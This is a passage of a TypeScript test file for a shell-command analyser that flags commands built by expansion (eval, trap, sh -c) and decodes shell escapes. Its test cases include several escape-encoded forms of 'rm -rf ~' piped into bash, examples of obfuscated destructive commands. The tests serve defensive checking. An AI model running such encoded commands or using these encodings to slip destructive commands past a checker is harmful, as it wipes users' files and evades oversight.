    'trap "$handler" EXIT',
    'xargs -I{} sh -c {}',
  ])('cannot read %s, which an expansion makes', (command) => {
    expect(found(command).opaque).toBe(true);
  });

  it.each([
    'sh -c "tail -f $FIFO"',
    'bash -c "cd $DIR && make"',
    "bash -c 'echo $HOME'",
    'sh -c "echo $x | wc -l"',
    'eval "echo $x"',
    "trap 'rm -f $TMP' EXIT",
    'bash -n script.sh',
    'bash -c',
    'trap - EXIT',
    'trap -p',
    "trap '' INT",
  ])('does not ask about %s: the string says what runs', (command) => {
    expect(found(command).opaque).toBe(false);
  });

  it('asks about a string that decodes into a pipe it cannot read', () => {
    expect(found('bash -c \'echo "$x" | bash\'').opaque).toBe(false);
    expect(decodePrograms('bash -c \'echo "$x" | bash\'').opaque).toBe(true);
  });
});

describe('shellInput decodes the escapes a shell decodes', () => {
  const found = (command: string) => shellInput(command);

  it.each<[string, string]>([
    ["echo -e '\\u0072m -rf ~' | bash", 'rm -rf ~'],
    ["echo -e '\\U00000072m -rf ~' | bash", 'rm -rf ~'],
    ["printf '\\u0072m -rf ~' | bash", 'rm -rf ~'],
    ["printf '%b' '\\u0072m -rf ~' | bash", 'rm -rf ~'],
    ["echo $'\\u0072m -rf ~' | bash", 'rm -rf ~'],
    ["echo $'ls\\cJrm -rf ~' | bash", 'ls\nrm -rf ~'],
    ["echo $'ls\\cjrm -rf ~' | bash", 'ls\nrm -rf ~'],
    ["echo -e '\\0162m -rf ~' | bash", 'rm -rf ~'],
    ["printf '\\162m -rf ~' | bash", 'rm -rf ~'],
    ["echo $'\\162m -rf ~' | bash", 'rm -rf ~'],
    ["echo $'\\x72m -rf ~' | bash", 'rm -rf ~'],
    ["echo $'\\? rm' | bash", '? rm'],
  ])('%s prints %j', (command, text) => {
    expect(found(command).texts).toEqual([text]);
  });

  it('does not decode what a shell leaves as it is', () => {
    // echo has no `\'`, `\"` or three-digit octal without the leading 0; printf and `$'…'` have them
    expect(found('echo "it\\\'s \\101" | bash').texts).toEqual(["it\\'s \\101"]);
    expect(found('printf "it\\\'s \\101" | bash').texts).toEqual(["it's A"]);
    expect(found("echo $'it\\'s \\101' | bash").texts).toEqual(["it's A"]);
  });

  it('keeps the quote an echo prints, so the program it makes is the one the shell reads', () => {
    expect(found("echo 'it'\\''s' | bash").texts).toEqual(["it's"]);
    expect(found('echo "x=\\\'y\\\'" | bash').texts).toEqual(["x=\\'y\\'"]);
  });
});
